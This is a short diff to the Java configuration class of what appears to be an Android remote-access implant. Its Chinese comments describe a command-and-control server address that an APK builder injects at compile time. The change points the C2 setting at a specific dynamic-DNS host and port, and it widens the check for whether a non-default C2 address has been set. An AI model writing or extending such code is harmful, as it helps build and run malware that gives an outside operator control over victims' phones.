@@ -9,8 +9,9 @@ public class Config {
     /**
      * C2 服务器地址 - 在编译时由 APK Builder 注入
      * 默认值在开发时使用，生产环境由服务端 apkBuilder.js 替换
+     * 格式: http://host:port 或 https://host:port
      */
-    public static String C2_SERVER = "http://127.0.0.1:80";
+    public static String C2_SERVER = "http://ubuntu222506test.webredirect.org:8080";
     
     /**
      * Socket.IO 重连参数
@@ -46,9 +47,11 @@ public class Config {
     }
     
     /**
-     * 检查 C2 服务器地址是否设置
+     * 检查 C2 服务器地址是否设置（非默认地址）
      */
     public static boolean isC2ServerConfigured() {
-        return C2_SERVER != null && !C2_SERVER.isEmpty() && !C2_SERVER.equals("http://127.0.0.1:80");
+        return C2_SERVER != null && !C2_SERVER.isEmpty() && 
+               !C2_SERVER.equals("http://127.0.0.1:80") &&
+               !C2_SERVER.equals("http://localhost:80");
     }
 }
